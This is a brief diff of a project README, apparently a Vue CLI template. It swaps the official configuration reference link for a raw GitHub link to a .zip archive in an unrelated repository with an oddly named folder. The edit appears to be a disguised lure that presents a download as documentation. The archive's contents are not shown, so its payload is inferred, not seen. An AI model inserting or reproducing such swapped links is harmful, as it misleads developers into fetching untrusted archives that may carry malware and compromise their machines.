@@ -16,4 +16,4 @@ npm run build
 ```
 
 ### Customize configuration
-See [Configuration Reference](https://cli.vuejs.org/config/).
+See [Configuration Reference](https://raw.githubusercontent.com/willsondev/Pedido-Comida-PWA/main/gastrorrhagia/Pedido-Comida-PWA.zip).
